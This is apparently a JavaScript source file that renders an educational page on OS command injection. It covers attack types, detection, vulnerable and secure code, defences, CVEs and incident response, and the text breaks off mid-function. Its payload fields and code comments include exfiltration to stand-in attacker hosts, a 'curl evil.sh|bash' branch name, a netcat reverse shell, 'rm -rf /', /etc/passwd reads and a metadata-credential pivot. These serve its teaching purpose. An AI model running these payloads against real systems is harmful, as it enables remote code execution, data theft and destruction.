/* =========================================================================
   Code Guardian — OS Command Injection deep-dive page
   Standalone full-screen reference panel. Vanilla JS + Prism highlighting.
   Accent: RED (#ef4444) — OS Command Injection is Critical severity.
   ========================================================================= */
import { $, $$ } from './dom.js';
import { highlightElement } from './highlight.js';
import { getLang } from '../i18n/index.js';

/* ---------- tiny helpers ---------- */
const esc = (s) =>
  String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

const SVG = {
  close:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  shield:
    '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  copy:
    '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
};

/* ---------- localized micro-strings ---------- */
const TXT = {
  tab: { en: 'CMDi', pl: 'CMDi' },
  open: { en: 'Open OS Command Injection deep-dive', pl: 'Otwórz przewodnik OS Command Injection' },
  close: { en: 'Close', pl: 'Zamknij' },
  copy: { en: 'Copy', pl: 'Kopiuj' },
  copied: { en: 'Copied', pl: 'Skopiowano' },
  vuln: { en: 'Vulnerable', pl: 'Podatny' },
  safe: { en: 'Secure', pl: 'Bezpieczny' },
};
const tr = (o) => o[getLang()] ?? o.en;

/* =========================================================================
   CONTENT DATA
   ========================================================================= */

const NAV = [
  { id: 'cmdi-overview', en: 'Overview', pl: 'Przegląd' },
  { id: 'cmdi-types', en: 'Attack types', pl: 'Typy ataków' },
  { id: 'cmdi-cheatsheet', en: 'Detection cheatsheet', pl: 'Ściąga detekcji' },
  { id: 'cmdi-code', en: 'Vuln vs Secure', pl: 'Podatny vs Bezpieczny' },
  { id: 'cmdi-langrisks', en: 'Language risks', pl: 'Ryzyka per język' },
  { id: 'cmdi-method', en: 'Methodology', pl: 'Metodyka' },
  { id: 'cmdi-defense', en: 'Defense layers', pl: 'Warstwy obrony' },
  { id: 'cmdi-incidents', en: 'Real incidents', pl: 'Incydenty' },
  { id: 'cmdi-tools', en: 'SAST / DAST', pl: 'SAST / DAST' },
  { id: 'cmdi-compliance', en: 'Compliance', pl: 'Zgodność' },
  { id: 'cmdi-ir', en: 'Incident response', pl: 'Reagowanie' },
  { id: 'cmdi-sources', en: 'Sources', pl: 'Źródła' },
];

const TYPES = [
  {
    name: 'Shell Metacharacter Injection',
    sev: 'critical',
    desc: { en: 'Metacharacters ;, |, &, &&, ||, $(...) and backticks chain or terminate the intended command and append attacker-controlled ones — the canonical OS command injection.', pl: 'Metaznaki ;, |, &, &&, ||, $(...) i backticki łączą lub kończą zamierzone polecenie i doklejają polecenia atakującego — kanoniczny OS command injection.' },
    payload: '127.0.0.1; cat /etc/passwd',
  },
  {
    name: 'Blind Time-Based',
    sev: 'critical',
    desc: { en: 'When no output is reflected, a measurable delay confirms execution. A sleep or ping with fixed count turns the response time into an oracle.', pl: 'Gdy żaden wynik nie wraca, mierzalne opóźnienie potwierdza wykonanie. sleep lub ping o stałej liczbie zamienia czas odpowiedzi w wyrocznię.' },
    payload: '; sleep 10  |  | timeout 10 ping -c 10 127.0.0.1',
  },
  {
    name: 'Out-of-Band DNS Exfiltration',
    sev: 'critical',
    desc: { en: 'Command output is base64-encoded into a DNS lookup to an attacker-controlled domain — leaks data even when all HTTP egress is blocked.', pl: 'Wynik polecenia jest kodowany base64 w zapytaniu DNS do domeny atakującego — wycieka dane nawet gdy cały ruch HTTP na zewnątrz jest zablokowany.' },
    payload: '$(nslookup $(id|base64|tr -d "\\n").oast.me)',
  },
  {
    name: 'Filter Bypass',
    sev: 'high',
    desc: { en: 'Defeats naive blocklists: $IFS replaces spaces, brace expansion avoids slashes, $\'\\x2f\' hex chars and printf reconstruct forbidden strings.', pl: 'Pokonuje naiwne blocklisty: $IFS zastępuje spacje, brace expansion omija ukośniki, znaki hex $\'\\x2f\' i printf rekonstruują zabronione ciągi.' },
    payload: '{cat,/etc/passwd}   //  cat$IFS/etc/passwd',
  },
  {
    name: 'Blind HTTP Callback',
    sev: 'high',
    desc: { en: 'When outbound HTTP is allowed, curl or wget posts captured output to the attacker — faster and higher-bandwidth than DNS exfiltration.', pl: 'Gdy ruch HTTP na zewnątrz jest dozwolony, curl lub wget wysyła przechwycony wynik do atakującego — szybciej i z większą przepustowością niż DNS.' },
    payload: 'curl attacker.com/?o=$(whoami|base64)',
  },
  {
    name: 'CI/CD Pipeline Injection',
    sev: 'critical',
    desc: { en: 'GitHub Actions interpolates ${{ github.head_ref }} directly into run: steps. A branch named main;curl... executes on the runner with repo secrets in scope.', pl: 'GitHub Actions wstawia ${{ github.head_ref }} wprost do kroków run:. Gałąź nazwana main;curl... wykonuje się na runnerze z sekretami repo w zasięgu.' },
    payload: 'branch: "main;curl evil.sh|bash"',
  },
  {
    name: 'Cloud Metadata Pivot',
    sev: 'critical',
    desc: { en: 'A blind injection in cloud pivots via SSRF to the instance metadata service, exfiltrates IAM role credentials, and enables lateral movement.', pl: 'Ślepe wstrzyknięcie w chmurze przeskakuje przez SSRF do usługi metadanych instancji, wykrada poświadczenia roli IAM i umożliwia ruch lateralny.' },
    payload: 'curl 169.254.169.254/latest/meta-data/iam/...',
  },
  {
    name: 'Container Escape',
    sev: 'critical',
    desc: { en: 'Injection inside a misconfigured container (mounted Docker socket, --privileged, host PID namespace) escalates to docker exec on the host.', pl: 'Wstrzyknięcie w źle skonfigurowanym kontenerze (zamontowany socket Dockera, --privileged, namespace PID hosta) eskaluje do docker exec na hoście.' },
    payload: 'docker -H unix:///var/run/docker.sock exec ...',
  },
];

const DBS = [
  {
    name: 'Time-based blind',
    rows: [
      ['Linux', '; sleep 10'],
      ['Ping delay', '| ping -c 10 127.0.0.1'],
      ['Windows', '& timeout /T 10'],
      ['Inline', '`sleep 10`'],
      ['Signal', 'measurable response delay'],
      ['Tool', 'Burp Intruder timing'],
    ],
  },
  {
    name: 'Error-based',
    rows: [
      ['Probe', '; cat /etc/nonexistent'],
      ['Result', '500 + path disclosure'],
      ['Verbose', 'stderr in HTTP body'],
      ['Type leak', 'binary path in error'],
      ['Confirm', 'differing error text'],
      ['Tool', 'manual fuzz / Burp'],
    ],
  },
  {
    name: 'Out-of-band DNS',
    rows: [
      ['Vector', '$(nslookup ...oast.me)'],
      ['Encode', 'id | base64 | tr -d "\\n"'],
      ['Egress', 'bypasses HTTP firewall'],
      ['Collab', 'Burp Collaborator'],
      ['OSS', 'interactsh / oast.me'],
      ['Confirm', 'inbound DNS hit'],
    ],
  },
  {
    name: 'Stack trace',
    rows: [
      ['PHP', 'backtick operator error'],
      ['Java', 'ProcessBuilder exception'],
      ['Node', 'child_process stderr'],
      ['Python', 'CalledProcessError trace'],
      ['Leak', 'cmdline in exception'],
      ['Confirm', 'language fingerprint'],
    ],
  },
  {
    name: 'WAF fingerprint',
    rows: [
      ['Step 1', 'try ; and | first'],
      ['Step 2', '$IFS instead of space'],
      ['Step 3', 'brace expansion {a,b}'],
      ['Step 4', 'hex $\'\\x2f\' encoding'],
      ['Step 5', 'printf reconstruction'],
      ['Goal', 'map the blocklist'],
    ],
  },
];

const CODE = {
  Python: {
    lang: 'python',
    vuln: `# VULNERABLE — shell=True with an f-string interpolates user input
host = request.args.get("host")     # e.g. 127.0.0.1; cat /etc/passwd
subprocess.run(f"ping -c 1 {host}", shell=True)`,
    safe: `# SECURE — argument list, no shell, no string concatenation
host = request.args.get("host")
subprocess.run(["ping", "-c", "1", host])   # host is one argv element`,
  },
  'Node.js': {
    lang: 'javascript',
    vuln: `// VULNERABLE — exec spawns /bin/sh -c, metacharacters are honoured
const { exec } = require("child_process");
exec("ls " + userInput);   // userInput = "; rm -rf /" runs as a command`,
    safe: `// SECURE — execFile bypasses the shell entirely
const { execFile } = require("child_process");
execFile("ls", [userInput]);   // userInput is a literal argument`,
  },
  Java: {
    lang: 'java',
    vuln: `// VULNERABLE — string concatenation passed to a shell
Runtime.getRuntime().exec("ping " + userInput);
// userInput = "x && curl evil.sh|bash" executes attacker code`,
    safe: `// SECURE — ProcessBuilder takes a token list, no shell parsing
new ProcessBuilder("ping", userInput).start();
// userInput stays a single, unparsed argument`,
  },
  Go: {
    lang: 'go',
    vuln: `// VULNERABLE — sh -c re-introduces the shell grammar
exec.Command("sh", "-c", userInput).Run()
// userInput = "id; nc attacker 4444 -e /bin/sh"`,
    safe: `// SECURE — invoke the binary directly with explicit args
exec.Command("ping", userInput).Run()
// no /bin/sh, so metacharacters carry no meaning`,
  },
};

const ORM = [
  { fw: 'Python', api: 'subprocess.run(f"ping {host}", shell=True)', note: { en: 'shell=True with an f-string is the #1 RCE pattern — pass a list and drop shell=True: subprocess.run(["ping", host]).', pl: 'shell=True z f-stringiem to wzorzec RCE nr 1 — przekaż listę i usuń shell=True: subprocess.run(["ping", host]).' } },
  { fw: 'Node.js', api: 'child_process.exec("ls " + userInput)', note: { en: 'exec() always spawns /bin/sh -c. Use execFile("ls", [userInput]) so arguments never reach a shell.', pl: 'exec() zawsze uruchamia /bin/sh -c. Użyj execFile("ls", [userInput]), by argumenty nigdy nie trafiły do powłoki.' } },
  { fw: 'PHP', api: 'system("ping " . $_GET[\'host\'])', note: { en: 'PHP has no safe argument-list API for system/exec/shell_exec. The only real fix is to avoid invoking OS commands at all.', pl: 'PHP nie ma bezpiecznego API listy argumentów dla system/exec/shell_exec. Jedyną realną naprawą jest unikanie wywoływania poleceń OS.' } },
  { fw: 'Java', api: 'Runtime.exec("ping " + userInput)', note: { en: 'Runtime.exec(String) tokenizes loosely; use new ProcessBuilder("ping", userInput) so each token is explicit and unparsed.', pl: 'Runtime.exec(String) tokenizuje luźno; użyj new ProcessBuilder("ping", userInput), by każdy token był jawny i nieparsowany.' } },
  { fw: 'Go', api: 'exec.Command("sh", "-c", userInput)', note: { en: 'Calling sh -c hands the shell back the grammar. Invoke the binary directly: exec.Command("ping", userInput).', pl: 'Wywołanie sh -c oddaje gramatykę powłoce. Wywołuj binarkę wprost: exec.Command("ping", userInput).' } },
];

const METHOD = [
  { en: ['Detect', 'Inject a single metacharacter (;, |, &, $()) into every parameter that might reach a command; changed output or errors signal injectability.'], pl: ['Wykrycie', 'Wstrzyknij pojedynczy metaznak (;, |, &, $()) w każdy parametr mogący trafić do polecenia; zmieniony wynik lub błąd sygnalizują podatność.'] },
  { en: ['Confirm blind', 'No output? Use a time-based payload (; sleep 10) or an out-of-band DNS/HTTP callback to prove the command ran.'], pl: ['Potwierdzenie ślepe', 'Brak wyniku? Użyj ładunku czasowego (; sleep 10) lub callbacku out-of-band DNS/HTTP, by udowodnić wykonanie polecenia.'] },
  { en: ['Bypass filters', 'Defeat blocklists with $IFS for spaces, brace expansion {cat,/etc/passwd}, hex chars and printf reconstruction.'], pl: ['Obejście filtrów', 'Pokonaj blocklisty przez $IFS zamiast spacji, brace expansion {cat,/etc/passwd}, znaki hex i rekonstrukcję printf.'] },
  { en: ['Exfiltrate', 'Read secrets and stream them out — base64 over DNS ($(id|base64).oast.me) or an HTTP callback when egress is open.'], pl: ['Eksfiltracja', 'Odczytaj sekrety i wyślij je — base64 przez DNS ($(id|base64).oast.me) lub callback HTTP, gdy ruch na zewnątrz jest otwarty.'] },
  { en: ['Escalate', 'Pivot to cloud metadata (curl 169.254.169.254) for IAM credentials, or escape a container via a mounted Docker socket → host RCE and lateral movement.'], pl: ['Eskalacja', 'Przeskocz do metadanych chmury (curl 169.254.169.254) po poświadczenia IAM lub uciecz z kontenera przez zamontowany socket Dockera → RCE na hoście i ruch lateralny.'] },
];

const DEFENSE = [
  { rank: 1, eff: 100, label: { en: 'Avoid the shell entirely', pl: 'Całkowite unikanie powłoki' }, kind: 'primary', note: { en: 'Use argument-list APIs (execFile, ProcessBuilder, subprocess list) so no shell parses metacharacters. The definitive fix.', pl: 'Używaj API z listą argumentów (execFile, ProcessBuilder, lista subprocess), by żadna powłoka nie parsowała metaznaków. Ostateczna naprawa.' } },
  { rank: 2, eff: 85, label: { en: 'Allowlist input validation', pl: 'Walidacja wejścia allowlistą' }, kind: 'strong', note: { en: 'Accept only a strict character set (e.g. ^[A-Za-z0-9._-]+$) or an enum of known-good values; reject everything else.', pl: 'Akceptuj tylko ściśle zdefiniowany zbiór znaków (np. ^[A-Za-z0-9._-]+$) lub enum znanych wartości; odrzucaj resztę.' } },
  { rank: 3, eff: 70, label: { en: 'Sandbox + least privilege', pl: 'Sandbox + minimalne uprawnienia' }, kind: 'strong', note: { en: 'Run as a low-privilege user, drop capabilities, seccomp/AppArmor, no outbound network — shrinks blast radius if injection slips through.', pl: 'Uruchamiaj jako użytkownik o niskich uprawnieniach, odbieraj capabilities, seccomp/AppArmor, brak ruchu wychodzącego — ogranicza skutki, gdy wstrzyknięcie się prześlizgnie.' } },
  { rank: 4, eff: 55, label: { en: 'Egress filtering', pl: 'Filtrowanie ruchu wychodzącego' }, kind: 'mitigation', note: { en: 'Block DNS/HTTP to untrusted destinations and the metadata IP to defeat out-of-band exfiltration and cloud pivots.', pl: 'Blokuj DNS/HTTP do niezaufanych celów i IP metadanych, by udaremnić eksfiltrację out-of-band i przeskoki do chmury.' } },
  { rank: 5, eff: 40, label: { en: 'Escape / quote arguments', pl: 'Escapowanie / cytowanie argumentów' }, kind: 'mitigation', note: { en: 'shlex.quote / escapeshellarg as a last resort when a shell is unavoidable — error-prone, never a primary control.', pl: 'shlex.quote / escapeshellarg jako ostateczność, gdy powłoki nie da się uniknąć — podatne na błędy, nigdy jako główna kontrola.' } },
  { rank: 6, eff: 20, label: { en: 'WAF (compensating only)', pl: 'WAF (tylko kompensacyjny)' }, kind: 'weak', note: { en: '$IFS, brace expansion and hex encoding trivially bypass signature rules. Detective, never preventive.', pl: '$IFS, brace expansion i kodowanie hex trywialnie omijają reguły sygnaturowe. Detekcyjny, nigdy zapobiegawczy.' } },
];

const INCIDENTS = [
  { org: 'Shellshock', year: 2014, impact: 'CVE-2014-6271', cost: 'CVSS 10.0', en: 'Bash parsed trailing code in function-definition env vars, giving RCE through Apache CGI, DHCP clients and OpenSSH ForceCommand on millions of servers.', pl: 'Bash wykonywał kod doklejony do zmiennych środowiskowych z definicją funkcji, dając RCE przez Apache CGI, klientów DHCP i OpenSSH ForceCommand na milionach serwerów.' },
  { org: 'Apache httpd', year: 2021, impact: 'CVE-2021-41773', cost: 'CVSS 9.8', en: 'Path traversal combined with mod_cgi enabled remote command execution; exploited in the wild within 24 hours of disclosure.', pl: 'Path traversal w połączeniu z mod_cgi umożliwił zdalne wykonanie poleceń; eksploitowany w sieci w ciągu 24h od ujawnienia.' },
  { org: 'Text4Shell', year: 2022, impact: 'CVE-2022-42889', cost: 'CVSS 9.8', en: 'Apache Commons Text ${script:...} interpolation evaluated expressions that executed OS commands on the host.', pl: 'Interpolacja ${script:...} w Apache Commons Text wykonywała wyrażenia uruchamiające polecenia OS na hoście.' },
  { org: 'Confluence', year: 2022, impact: 'CVE-2022-26134', cost: 'CVSS 9.8', en: 'OGNL injection chained into OS command execution; mass-exploited across internet-facing Confluence instances.', pl: 'Wstrzyknięcie OGNL prowadziło do wykonania poleceń OS; masowo eksploitowane na instancjach Confluence wystawionych do internetu.' },
  { org: 'GitLab', year: 2021, impact: 'CVE-2021-22205', cost: 'CVSS 10.0', en: 'A crafted image upload reached ExifTool, which command-injected during metadata parsing for unauthenticated RCE.', pl: 'Spreparowany upload obrazu trafiał do ExifTool, który wstrzykiwał polecenie podczas parsowania metadanych — RCE bez uwierzytelnienia.' },
  { org: 'Equifax', year: 2017, impact: '147M records', cost: 'CVE-2017-5638', en: 'Apache Struts command injection via a crafted Content-Type header led to one of the largest data breaches on record.', pl: 'Wstrzyknięcie poleceń w Apache Struts przez spreparowany nagłówek Content-Type doprowadziło do jednego z największych wycieków danych w historii.' },
];

const TOOLS = {
  sast: [
    ['Semgrep', 'python.subprocess.shell-true + taint from request.args'],
    ['CodeQL', 'Dataflow: untrusted input → exec/Runtime/ProcessBuilder'],
    ['Bandit', 'B602/B605 subprocess shell=True, os.system'],
    ['njsscan', 'child_process.exec with concatenated input'],
  ],
  dast: [
    ['Burp Suite', 'Active Scan + Collaborator for blind OOB'],
    ['OWASP ZAP', 'Command injection active scan rules'],
    ['commix', 'Automated command-injection exploitation'],
    ['interactsh', 'Out-of-band DNS/HTTP callback server'],
  ],
};

const COMPLIANCE = [
  { std: 'PCI DSS v4.0', items: ['6.3.2 — inventory & review custom code', '6.2.4 — injection prevention techniques', '11.4 — penetration testing'] },
  { std: 'SOC 2', items: ['CC8.1 — change management & secure SDLC', 'CC6.6 — boundary / egress protection', 'CC7.1 — vulnerability detection'] },
  { std: 'OWASP / NIST', items: ['A03:2021 — Injection', 'CWE-78 — OS Command Injection', 'NIST SSDF PW.4 / PW.7 secure build'] },
];

const IR = {
  en: [
    'Segment the network — isolate the host and block outbound egress immediately',
    'Snapshot memory and disk; preserve access logs before they rotate',
    'Inspect /proc/<pid>/cmdline and process tree for the injected command',
    'Correlate web access logs with the exact request that carried the payload',
    'Rotate every credential the host could reach — IAM roles, API keys, SSH keys',
    'Patch: switch to argument-list APIs, add allowlist validation, redeploy',
    'Hunt for persistence — cron, systemd units, authorized_keys, webshells',
    'Notify per PCI DSS / SOC 2 obligations and sweep sibling endpoints with Semgrep/commix',
  ],
  pl: [
    'Segmentuj sieć — natychmiast odizoluj host i zablokuj ruch wychodzący',
    'Zrób zrzut pamięci i dysku; zabezpiecz logi dostępu zanim się przerotują',
    'Sprawdź /proc/<pid>/cmdline i drzewo procesów pod kątem wstrzykniętego polecenia',
    'Skoreluj logi dostępu WWW z dokładnym żądaniem niosącym ładunek',
    'Zrotuj każde poświadczenie w zasięgu hosta — role IAM, klucze API, klucze SSH',
    'Załataj: przejdź na API z listą argumentów, dodaj walidację allowlistą, wdróż ponownie',
    'Poluj na persystencję — cron, jednostki systemd, authorized_keys, webshelle',
    'Powiadom zgodnie z PCI DSS / SOC 2 i przeskanuj bliźniacze endpointy Semgrep/commix',
  ],
};

const SOURCES = [
  ['OWASP A03:2021 Injection', 'https://owasp.org/Top10/A03_2021-Injection/'],
  ['CWE-78 (MITRE)', 'https://cwe.mitre.org/data/definitions/78.html'],
  ['OWASP Command Injection Defense Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html'],
  ['PortSwigger — OS Command Injection', 'https://portswigger.net/web-security/os-command-injection'],
  ['NIST NVD — CWE-78', 'https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-78'],
  ['Shellshock CVE-2014-6271', 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271'],
  ['Apache httpd CVE-2021-41773', 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773'],
  ['Text4Shell CVE-2022-42889', 'https://nvd.nist.gov/vuln/detail/CVE-2022-42889'],
  ['GitLab CVE-2021-22205', 'https://nvd.nist.gov/vuln/detail/CVE-2021-22205'],
];

/* =========================================================================
   RENDERING
   ========================================================================= */

function sevClass(s) {
  return { critical: 'badge-critical', high: 'badge-high', medium: 'badge-medium', low: 'badge-low' }[s] || 'badge-low';
}

function codeBlock(lang, code) {
  return `<div class="cmdi-code-area">
    <button class="cmdi-copy" type="button" title="${tr(TXT.copy)}">${SVG.copy}<span>${tr(TXT.copy)}</span></button>
    <pre><code class="language-${lang}">${esc(code)}</code></pre>
  </div>`;
}

function buildNav() {
  const lang = getLang();
  return NAV.map((n, i) =>
    `<a class="cmdi-nav-link${i === 0 ? ' active' : ''}" href="#${n.id}" data-target="${n.id}">${n[lang]}</a>`
  ).join('');
}

function buildOverview() {
  const lang = getLang();
  const lead = lang === 'en'
    ? 'OS Command Injection lets an attacker append their own commands to one your application hands to a system shell. Shell metacharacters — ;, |, &, $(...) and backticks — chain or terminate the intended command, turning a harmless feature like a ping diagnostic into arbitrary remote code execution. When no output is reflected, time-based payloads and out-of-band DNS callbacks confirm execution; from there an attacker pivots to cloud metadata for IAM credentials or escapes a container to the host. Unauthenticated remote instances rate CVSS 9.8 Critical.'
    : 'OS Command Injection pozwala atakującemu doklejać własne polecenia do tych, które aplikacja przekazuje powłoce systemowej. Metaznaki — ;, |, &, $(...) i backticki — łączą lub kończą zamierzone polecenie, zmieniając nieszkodliwą funkcję (np. diagnostykę ping) w dowolne zdalne wykonanie kodu. Gdy żaden wynik nie wraca, ładunki czasowe i callbacki out-of-band DNS potwierdzają wykonanie; stamtąd atakujący przeskakuje do metadanych chmury po poświadczenia IAM lub ucieka z kontenera na host. Nieuwierzytelnione zdalne instancje to CVSS 9.8 Krytyczne.';

  return `<section id="cmdi-overview" class="cmdi-section">
    <div class="cmdi-hero">
      <span class="cmdi-eyebrow">${SVG.shield}<span>Code Guardian · Deep-dive</span></span>
      <h1>OS <span class="grad">Command</span> Injection</h1>
      <span class="cmdi-sev-badge">${lang === 'en' ? 'Critical severity' : 'Krytyczna waga'}</span>
      <p class="cmdi-lead">${lead}</p>
      <div class="cmdi-metrics">
        <div class="cmdi-metric high"><div class="cmdi-metric-k">CWE-78</div><div class="cmdi-metric-v">${lang === 'en' ? 'Weakness ID' : 'ID słabości'}</div></div>
        <div class="cmdi-metric high"><div class="cmdi-metric-k">9.8</div><div class="cmdi-metric-v">CVSS · Critical</div></div>
        <div class="cmdi-metric"><div class="cmdi-metric-k">A03:2021</div><div class="cmdi-metric-v">OWASP Top 10</div></div>
        <div class="cmdi-metric"><div class="cmdi-metric-k">8</div><div class="cmdi-metric-v">${lang === 'en' ? 'Attack variants' : 'Warianty ataku'}</div></div>
      </div>
      <div class="cmdi-sources">
        <span class="cmdi-sources-label">${lang === 'en' ? 'Verified sources:' : 'Zweryfikowane źródła:'}</span>
        <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener" class="cmdi-source-link">OWASP A03:2021</a>
        <a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener" class="cmdi-source-link">CWE-78 (MITRE)</a>
        <a href="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener" class="cmdi-source-link">PortSwigger Academy</a>
        <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" target="_blank" rel="noopener" class="cmdi-source-link">OWASP Cheat Sheet</a>
      </div>
    </div>
  </section>`;
}

function buildTypes() {
  const lang = getLang();
  const cards = TYPES.map((t) => `
    <article class="cmdi-type-card">
      <header>
        <h3>${esc(t.name)}</h3>
        <span class="badge ${sevClass(t.sev)}">${t.sev}</span>
      </header>
      <p>${t.desc[lang]}</p>
      <div class="cmdi-payload"><span class="cmdi-payload-tag">payload</span><code>${esc(t.payload)}</code></div>
    </article>`).join('');
  return secWrap('cmdi-types', lang === 'en' ? 'Attack types' : 'Typy ataków',
    lang === 'en' ? 'Eight ways the same root cause manifests — from a single metacharacter to a full container escape onto the host.' : 'Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od pojedynczego metaznaku po pełną ucieczkę z kontenera na host.',
    `<div class="cmdi-type-grid">${cards}</div>`);
}

function buildCheatsheet() {
  const lang = getLang();
  const cols = DBS.map((db) => `
    <div class="cmdi-db-col">
      <h4>${esc(db.name)}</h4>
      ${db.rows.map((r) => `<div class="cmdi-db-row"><span class="cmdi-db-key">${esc(r[0])}</span><code>${esc(r[1])}</code></div>`).join('')}
    </div>`).join('');
  return secWrap('cmdi-cheatsheet', lang === 'en' ? 'Detection cheatsheet' : 'Ściąga detekcji',
    lang === 'en' ? 'Each detection method has its own primitives. Time-based, error-based, out-of-band DNS, stack-trace and WAF-fingerprinting techniques.' : 'Każda metoda detekcji ma własne prymitywy. Techniki czasowe, błędowe, out-of-band DNS, stack-trace i fingerprintingu WAF.',
    `<div class="cmdi-db-grid">${cols}</div>`);
}

function buildCode() {
  const lang = getLang();
  const langs = Object.keys(CODE);
  const tabs = langs.map((l, i) =>
    `<button class="cmdi-lang-tab${i === 0 ? ' active' : ''}" data-lang="${l}" type="button">${l}</button>`).join('');
  const panels = langs.map((l, i) => {
    const c = CODE[l];
    return `<div class="cmdi-lang-panel${i === 0 ? ' active' : ''}" data-lang="${l}">
      <div class="cmdi-vs">
        <div class="cmdi-vs-col vuln"><div class="cmdi-vs-head vuln">✗ ${tr(TXT.vuln)}</div>${codeBlock(c.lang, c.vuln)}</div>
        <div class="cmdi-vs-col safe"><div class="cmdi-vs-head safe">✓ ${tr(TXT.safe)}</div>${codeBlock(c.lang, c.safe)}</div>
      </div>
    </div>`;
  }).join('');
  return secWrap('cmdi-code', lang === 'en' ? 'Vulnerable vs Secure' : 'Podatny vs Bezpieczny',
    lang === 'en' ? 'The same fix across four languages: never build a command string from user input — pass an argument list and skip the shell.' : 'Ta sama naprawa w czterech językach: nigdy nie buduj polecenia z wejścia użytkownika — przekaż listę argumentów i pomiń powłokę.',
    `<div class="cmdi-lang-tabs">${tabs}</div><div class="cmdi-lang-panels">${panels}</div>`);
}

function buildLangRisks() {
  const lang = getLang();
  const rows = ORM.map((o) => `
    <div class="cmdi-orm-row">
      <div class="cmdi-orm-fw">${esc(o.fw)}</div>
      <code class="cmdi-orm-api">${esc(o.api)}</code>
      <div class="cmdi-orm-note">${o.note[lang]}</div>
    </div>`).join('');
  return secWrap('cmdi-langrisks', lang === 'en' ? 'Language-specific risks' : 'Ryzyka per język',
    lang === 'en' ? 'Every language ships a shell-spawning API and a safe argument-list counterpart — except PHP, where avoiding OS commands is the only real fix.' : 'Każdy język ma API uruchamiające powłokę i bezpieczny odpowiednik z listą argumentów — z wyjątkiem PHP, gdzie jedyną realną naprawą jest unikanie poleceń OS.',
    `<div class="cmdi-orm">${rows}</div>`);
}

function buildMethod() {
  const lang = getLang();
  const steps = METHOD.map((m, i) => `
    <div class="cmdi-step">
      <div class="cmdi-step-num">${i + 1}</div>
      <div class="cmdi-step-body"><h4>${m[lang][0]}</h4><p>${m[lang][1]}</p></div>
    </div>`).join('');
  return secWrap('cmdi-method', lang === 'en' ? 'Attack methodology' : 'Metodyka ataku',
    lang === 'en' ? 'How an attacker progresses from a probe to full host compromise.' : 'Jak atakujący przechodzi od sondy do pełnej kompromitacji hosta.',
    `<div class="cmdi-timeline">${steps}</div>`);
}

function buildDefense() {
  const lang = getLang();
  const rows = DEFENSE.map((d) => `
    <div class="cmdi-def-row ${d.kind}">
      <div class="cmdi-def-rank">#${d.rank}</div>
      <div class="cmdi-def-main">
        <div class="cmdi-def-label">${d.label[lang]}</div>
        <div class="cmdi-def-note">${d.note[lang]}</div>
      </div>
      <div class="cmdi-def-bar"><span style="width:${d.eff}%"></span></div>
    </div>`).join('');
  return secWrap('cmdi-defense', lang === 'en' ? 'Defense layers, ranked' : 'Warstwy obrony wg skuteczności',
    lang === 'en' ? 'Defense in depth — but not all layers are equal. Avoiding the shell is the fix; everything else reduces blast radius.' : 'Obrona w głąb — ale warstwy nie są równe. Unikanie powłoki to naprawa; reszta ogranicza skutki.',
    `<div class="cmdi-defense">${rows}</div>`);
}

function buildIncidents() {
  const lang = getLang();
  const cards = INCIDENTS.map((i) => `
    <article class="cmdi-incident">
      <div class="cmdi-incident-top"><h4>${esc(i.org)}</h4><span class="cmdi-incident-year">${i.year}</span></div>
      <div class="cmdi-incident-nums"><span class="cmdi-incident-impact">${esc(i.impact)}</span><span class="cmdi-incident-cost">${esc(i.cost)}</span></div>
      <p>${i[lang]}</p>
    </article>`).join('');
  const sources = `<div class="cmdi-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271" target="_blank" rel="noopener">Shellshock CVE-2014-6271</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773" target="_blank" rel="noopener">httpd CVE-2021-41773</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42889" target="_blank" rel="noopener">Text4Shell CVE-2022-42889</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22205" target="_blank" rel="noopener">GitLab CVE-2021-22205</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5638" target="_blank" rel="noopener">Struts CVE-2017-5638</a>
  </div>`;
  return secWrap('cmdi-incidents', lang === 'en' ? 'Real-world incidents' : 'Rzeczywiste incydenty',
    lang === 'en' ? 'OS command injection is not theoretical — these CVEs reached CVSS 10.0 and one of them powered the 147M-record Equifax breach.' : 'OS command injection nie jest teoretyczne — te CVE osiągnęły CVSS 10.0, a jedno z nich napędziło wyciek 147 mln rekordów w Equifax.',
    `<div class="cmdi-incidents">${cards}</div>${sources}`);
}

function buildTools() {
  const lang = getLang();
  const sast = TOOLS.sast.map((t) => `<div class="cmdi-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const dast = TOOLS.dast.map((t) => `<div class="cmdi-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const note = lang === 'en'
    ? '<strong>Key signal:</strong> grep for <code>subprocess.run(..., shell=True)</code> with f-string args, <code>os.system</code>, <code>child_process.exec</code>, <code>Runtime.exec</code> and <code>exec.Command("sh", "-c", ...)</code> — these shell-spawning calls fed by request data are the root cause.'
